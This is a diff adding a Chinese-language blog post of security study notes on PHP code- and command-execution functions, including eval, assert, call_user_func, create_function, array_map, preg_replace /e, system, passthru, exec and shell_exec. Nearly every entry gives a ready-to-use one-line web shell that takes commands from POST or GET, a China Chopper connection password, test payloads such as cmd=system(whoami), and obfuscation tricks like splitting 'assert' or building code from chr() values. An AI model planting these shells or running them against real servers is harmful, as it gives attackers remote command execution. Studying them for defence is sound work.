@@ -1,0 +1,1002 @@
+
+<!DOCTYPE html><html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 7.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>php命令执行 - 我的博客</title>
+
+  
+    <meta name="description" content="PHP命令执行PHP常见代码执行函数和命令执行函数代码执行函数：主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，****call_user_func_array()，array_filter()，uasort()，preg_replace()  1- eval()1传入的参数必须为PHP代码，既需要以分号">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php命令执行">
+<meta property="og:url" content="http://example.com/2026/03/29/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+<meta property="og:site_name" content="我的博客">
+<meta property="og:description" content="PHP命令执行PHP常见代码执行函数和命令执行函数代码执行函数：主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，****call_user_func_array()，array_filter()，uasort()，preg_replace()  1- eval()1传入的参数必须为PHP代码，既需要以分号">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/84553ce867316ab6b4e6d0adaf984d48.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/249decc67ee9ef33fb38511372b097a9.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/84d4e6dcabd1e8049c9d13e9f261528d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d581330b3923a5af58893400cc5b82f8.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/ef228cb5dc0f6231b55295f70e429858.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/2cfb45f65032cd468b73a394da67c662.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0e62f4aaa160d5bcfb5ce6fe8b1c9740.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/a8484fc15812670a6240d37c277b7293.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/211c3d7e148e1cc7c6fe0b5a98102289.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/55979ade637160418bf00016c98d2b3d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/36044c8c119f9f0316bb5aad47d14f82.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/382d063f1e2b94e95c63996fd609990d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c853cf9b4b13e14a992e844eea49f751.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d7667320dc0d2bbe8330e36be3b419ab.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/d0ae35d0e32049e040fc186b5262df73.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0d977925e5ef3fda55a817852a47d4ad.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/f458c00f448f830c08d04533d3bba32f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e84ebd039dc689887a8984976aa85e0b.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4d172b79808748078ac55b36226d4dba.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4b9bd02f14f6be2eb8e54c1313cc1983.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/71101c30d00e58a55fd5d1628b73e7d7.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0579afc5eeeb871383a734b502dbb5d5.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/01f4e5bacbf58a4d0faad7543b94904d.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/79413480e4dd0d8cf8de5557f2b1450f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b65e7e25856e610220f519ca80c00283.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/17024e08722bfdd62e693d0b60d5b3d7.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0ddd432497684fded563708bbdabd7bb.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e079640c2ac442f81db6abc116af8366.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/4adf944521b459cf83191eb49f5cae66.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/13d050eb58a7286f67aa9f5b6855279f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c6da50404cbdf0a8ae311695b65ab545.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/bbe97ca4d17f950c79b059cd4a8c357f.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/ad3394b58f81ab798a19f727a2611fff.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/779d7b2e7955a73a96b4a497abb92c47.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/78da3c49ae92851fae70433beaab3526.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/1ac4e6fd06b5c160067acd8ad0252532.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/15f507409aed793ac23c0c8af5b32242.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/8327bf370b07ea3a1f7b4d17e9c256a0.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/73e07f38f1e4764c4df7ee370371fb98.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/70d65bb950c7ad115066ad7f00469ad0.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/0654972127b328675920146bd227e83a.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/19a99f3a2f4f987d67e948b2afb6310a.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/24835284786b7b5d83fa2981025816d2.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/089044971b2d8ffae48603cbd8b35355.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/5141b1671a040db049171cb24159601e.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/e590a11b4978f1224322e27589043122.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b1ccd4a063dde87b81db17cb16cc4182.png">
+<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/c9d7dbeaf826eaf4c1ab388affeef651.png">
+<meta property="article:published_time" content="2026-03-29T12:23:49.000Z">
+<meta property="article:modified_time" content="2026-03-30T13:47:48.340Z">
+<meta property="article:author" content="Eleven-hacker">
+<meta property="article:tag" content="php命令执行">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i-blog.csdnimg.cn/blog_migrate/84553ce867316ab6b4e6d0adaf984d48.png">
+  
+  
+  
+  <meta name="keywords" content="php命令执行">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Eleven-hacker","sameAs":[]},"dateCreated":"2026-03-29T20:23:49+08:00","dateModified":"2026-03-30T21:47:48+08:00","datePublished":"2026-03-29T20:23:49+08:00","description":"","headline":"php命令执行","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/03/29/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},"publisher":{"@type":"Organization","name":"Eleven-hacker","sameAs":[]},"url":"http://example.com/2026/03/29/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","keywords":"php命令执行","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="undefined" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">我的博客</div><div class="sub cap">欢迎大家</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/03/29/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"><span class="title">php命令执行</span></a><a class="item title" href="/2026/03/29/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"><span class="title">php文件包含</span></a><a class="item title" href="/2026/03/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="title">php反序列化</span></a><a class="item title" href="/2026/03/17/sql%E6%B3%A8%E5%85%A5/"><span class="title">sql注入</span></a><a class="item title" href="/2026/02/01/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><span class="title">mysql学习笔记</span></a><a class="item title" href="/2025/12/21/Mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20(2)/"><span class="title">Mysql学习笔记（2）</span></a><a class="item title" href="/2025/12/21/test/"><span class="title">test</span></a><a class="item title" href="/2025/12/26/PHP/"><span class="title">PHP</span></a><a class="item title" href="/2025/12/08/hello-world/"><span class="title">Hello World</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-03-29T12:23:49.000Z">2026-03-29</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-03-30T13:47:48.340Z">2026-03-30</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>php命令执行</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="PHP命令执行"><a href="#PHP命令执行" class="headerlink" title="PHP命令执行"></a>PHP命令执行</h1><h2 id="PHP常见代码执行函数和命令执行函数"><a href="#PHP常见代码执行函数和命令执行函数" class="headerlink" title="PHP常见代码执行函数和命令执行函数"></a>PHP常见代码执行函数和命令执行函数</h2><h2 id="代码执行函数："><a href="#代码执行函数：" class="headerlink" title="代码执行函数："></a><strong>代码执行函数：</strong></h2><p><strong>主要有（9个）：eval()，assert()，call_user_func()，create_function()，array_map()，****call_user_func_array()，array_filter()，uasort()，preg_replace()</strong></p>
+<hr>
+<h3 id="1-eval"><a href="#1-eval" class="headerlink" title="1- eval()"></a><strong>1- eval()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传入的参数必须为PHP代码，既需要以分号结尾。    命令執行：cmd=<span class="title function_ invoke__">system</span>(whoami);    菜刀连接密码：cmd<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意这里是POST型，所以以火狐的插件HackBar作实验：</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/84553ce867316ab6b4e6d0adaf984d48.png"></p>
+<p><strong>显示的信息太乱了，我们使用 <pre> 标签可定义预格式化的文本。</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/249decc67ee9ef33fb38511372b097a9.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/84d4e6dcabd1e8049c9d13e9f261528d.png"></p>
+<p><strong>当然你不闭合<pre>标签也可以，不影响结果，但代码不规范。</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/d581330b3923a5af58893400cc5b82f8.png"></p>
+<p><strong>使用GET型，也不错：</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/ef228cb5dc0f6231b55295f70e429858.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/2cfb45f65032cd468b73a394da67c662.png"></p>
+<blockquote>
+<h4 id="特别注意：php中-是干什么的"><a href="#特别注意：php中-是干什么的" class="headerlink" title="特别注意：php中@是干什么的"></a><strong>特别注意：php中@是干什么的</strong></h4><p><strong>屏蔽掉出错信息,有@时就算连接出错,也不会报错的</strong></p>
+<p><strong>原因是防止别人根据错误提示信息来推测出你的数据库结构进行注入攻击一类的黑客行为</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0e62f4aaa160d5bcfb5ce6fe8b1c9740.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/a8484fc15812670a6240d37c277b7293.png"></p>
+</blockquote>
+<h3 id="2-assert-（最好不要加上分号作为结尾）"><a href="#2-assert-（最好不要加上分号作为结尾）" class="headerlink" title="2- assert()    --（最好不要加上分号作为结尾）"></a><strong>2- assert()    --（最好不要加上分号作为结尾）</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert函数是直接将传入的参数当成PHP代码直接，不需要以分号结尾（特别注意），有时加上分号不会显示结果。    命令執行：cmd=<span class="title function_ invoke__">system</span>(whoami)    菜刀连接密码：cmd<span class="meta">&lt;?php</span> @<span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/211c3d7e148e1cc7c6fe0b5a98102289.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/55979ade637160418bf00016c98d2b3d.png"></p>
+<h3 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3- call_user_func()"></a><strong>3- call_user_func()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传入的参数作为assert函数的参数    命令执行：cmd=<span class="title function_ invoke__">system</span>(whoami)    菜刀连接密码：cmd<span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://i-blog.csdnimg.cn/blog_migrate/36044c8c119f9f0316bb5aad47d14f82.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/382d063f1e2b94e95c63996fd609990d.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>call_user_func(<span class="variable">$_POST</span>[<span class="string">&quot;fun&quot;</span>],<span class="variable">$_POST</span>[<span class="string">&quot;para&quot;</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/c853cf9b4b13e14a992e844eea49f751.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/d7667320dc0d2bbe8330e36be3b419ab.png"></p>
+<h3 id="4-create-function"><a href="#4-create-function" class="headerlink" title="4- create_function()"></a><strong>4- create_function()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">创建匿名函数执行代码执行命令和上传文件参考<span class="keyword">eval</span>函数(必须加分号)。<span class="meta">&lt;?php</span> <span class="variable">$func</span> =<span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="variable">$func</span>(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p> <img src="https://i-blog.csdnimg.cn/blog_migrate/d0ae35d0e32049e040fc186b5262df73.png"><img src="https://i-blog.csdnimg.cn/blog_migrate/0d977925e5ef3fda55a817852a47d4ad.png"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="variable">$a</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;func&#x27;</span>];<span class="variable">$b</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&quot;echo <span class="subst">$a</span>&quot;</span>);<span class="variable">$b</span>(<span class="string">&#x27;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/f458c00f448f830c08d04533d3bba32f.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/e84ebd039dc689887a8984976aa85e0b.png"></p>
+<h3 id="5-array-map"><a href="#5-array-map" class="headerlink" title="5- array_map()"></a><strong>5- array_map()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。回调函数接受的参数数目应该和传递给 <span class="title function_ invoke__">array_map</span>() 函数的数组数目一致。    命令执行http:    菜刀连接http:<span class="meta">&lt;?php</span><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];<span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;<span class="variable">$new_array</span>=<span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);<span class="keyword">echo</span> <span class="variable">$new_array</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/4d172b79808748078ac55b36226d4dba.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/4b9bd02f14f6be2eb8e54c1313cc1983.png"> </p>
+<h3 id="6-call-user-func-array"><a href="#6-call-user-func-array" class="headerlink" title="6- call_user_func_array()"></a><strong>6- call_user_func_array()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将传入的参数作为数组的第一个值传递给assert函数    cmd=<span class="title function_ invoke__">system</span>(whoami)    菜刀连接密码：cmd<span class="meta">&lt;?php</span><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$cmd</span>;<span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;assert&quot;</span>,<span class="variable">$array</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/71101c30d00e58a55fd5d1628b73e7d7.png">  <img src="https://i-blog.csdnimg.cn/blog_migrate/0579afc5eeeb871383a734b502dbb5d5.png"></p>
+<h3 id="7-array-filter"><a href="#7-array-filter" class="headerlink" title="7- array_filter()"></a><strong>7- array_filter()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用回调函数过滤数组中的元素：<span class="title function_ invoke__">array_filter</span>(数组,函数)    命令执行func=system&amp;cmd=whoami    菜刀连接http:<span class="meta">&lt;?php</span><span class="variable">$cmd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="variable">$array1</span>=<span class="keyword">array</span>(<span class="variable">$cmd</span>);<span class="variable">$func</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];<span class="title function_ invoke__">array_filter</span>(<span class="variable">$array1</span>,<span class="variable">$func</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/01f4e5bacbf58a4d0faad7543b94904d.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/79413480e4dd0d8cf8de5557f2b1450f.png"></p>
+<h3 id="8-uasort-函数"><a href="#8-uasort-函数" class="headerlink" title="8- uasort()函数"></a><strong>8- uasort()函数</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php环境&gt;=&lt;<span class="number">5.6</span>才能用<span class="title function_ invoke__">uasort</span>() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。    命令执行：http:    菜刀连接：http:<span class="meta">&lt;?php</span>usort(<span class="variable">$_GET</span>,<span class="string">&#x27;asse&#x27;</span>.<span class="string">&#x27;rt&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/b65e7e25856e610220f519ca80c00283.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/17024e08722bfdd62e693d0b60d5b3d7.png"></p>
+<h3 id="9-preg-replace"><a href="#9-preg-replace" class="headerlink" title="9- preg_replace()"></a><strong>9- preg_replace()</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;正则规则&#x27;</span>,<span class="string">&#x27;替换字符&#x27;</span>，<span class="string">&#x27;目标字符&#x27;</span>)执行命令和上传文件参考assert函数(不需要加分号)。将目标字符中符合正则规则的字符替换为替换字符，此时如果正则规则中使用/e修饰符，则存在代码执行漏洞。<span class="meta">&lt;?php</span>preg_replace(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&quot;cmd&quot;</span>],<span class="string">&quot;jutst test&quot;</span>);<span class="meta">?&gt;</span>这里可以使用<span class="title function_ invoke__">chr</span>()函数转换ASCII编码来执行代码。<span class="keyword">eval</span>(<span class="title function_ invoke__">chr</span>(<span class="number">112</span>).<span class="title function_ invoke__">chr</span>(<span class="number">104</span>).<span class="title function_ invoke__">chr</span>(<span class="number">112</span>).<span class="title function_ invoke__">chr</span>(<span class="number">105</span>).<span class="title function_ invoke__">chr</span>(<span class="number">110</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">111</span>).<span class="title function_ invoke__">chr</span>(<span class="number">40</span>).<span class="title function_ invoke__">chr</span>(<span class="number">41</span>).<span class="title function_ invoke__">chr</span>(<span class="number">59</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/0ddd432497684fded563708bbdabd7bb.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/e079640c2ac442f81db6abc116af8366.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/4adf944521b459cf83191eb49f5cae66.png"></p>
+<p><strong>-------------------------------------------------</strong></p>
+<blockquote>
+<h2 id="命令执行函数："><a href="#命令执行函数：" class="headerlink" title="命令执行函数："></a><strong>命令执行函数：</strong></h2></blockquote>
+<p><strong>主要有（7个）：****system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``</strong></p>
+<hr>
+<h3 id="1-system"><a href="#1-system" class="headerlink" title="1- system()"></a><strong>1- system()</strong></h3><ul>
+<li><p>作用</p>
+<p>将字符串作为OS命令执行，自带输出功能。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**&lt;?php system($\_POST\[&quot;cmd&quot;\]);?&gt;**</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/13d050eb58a7286f67aa9f5b6855279f.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/c6da50404cbdf0a8ae311695b65ab545.png"></p>
+<p>还可以写入一句话木马：使用cmd下的echo命令（注意：这里type命令无法写入内容到文件中，只能创建一个空文件）</p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/bbe97ca4d17f950c79b059cd4a8c357f.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/ad3394b58f81ab798a19f727a2611fff.png"></p>
+<h3 id="2-passthru"><a href="#2-passthru" class="headerlink" title="2-passthru()"></a><strong>2-passthru()</strong></h3><ul>
+<li><p>作用</p>
+<p>将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**&lt;?php passthru($\_POST\[&quot;cmd&quot;\]);?&gt;**</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/779d7b2e7955a73a96b4a497abb92c47.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/78da3c49ae92851fae70433beaab3526.png"></p>
+<h3 id="3-exec"><a href="#3-exec" class="headerlink" title="3- exec()"></a><strong>3- exec()</strong></h3><ul>
+<li><p>作用</p>
+<p>将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo exec($\_POST\[&quot;cmd&quot;\]);?&gt;** </span><br><span class="line"></span><br><span class="line">**&lt;?php print exec($\_POST\[&quot;cmd&quot;\]);?&gt;**    //他的输出结果需要打印，system()不用打印</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/1ac4e6fd06b5c160067acd8ad0252532.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/15f507409aed793ac23c0c8af5b32242.png"></p>
+<p><img src="https://i-blog.csdnimg.cn/blog_migrate/8327bf370b07ea3a1f7b4d17e9c256a0.png"> <img src="https://i-blog.csdnimg.cn/blog_migrate/73e07f38f1e4764c4df7ee370371fb98.png"></p>
+<h3 id="4-pcntl-exec"><a href="#4-pcntl-exec" class="headerlink" title="4- pcntl_exec()"></a><strong>4- pcntl_exec()</strong></h3><p>**linux: **</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php pcntl\_exec(&quot;/bin/bash&quot;,array($\_POST\[&quot;cmd&quot;\])); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用的不多。暂时略过。</p>
+<h3 id="5-shell-exec"><a href="#5-shell-exec" class="headerlink" title="5- shell_exec()"></a><strong>5- shell_exec()</strong></h3><ul>
+<li><p>作用</p>
+<p>将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容。</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">**&lt;?php echo shell\_exec($\_POST\[&quot;cmd&quot;\]); ?&gt;**</span><br><span class="line"></span><br><span class="line">**&lt;?php print shell\_exec($\_POST\[&quot;cmd&quot;\]); ?&gt;**</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
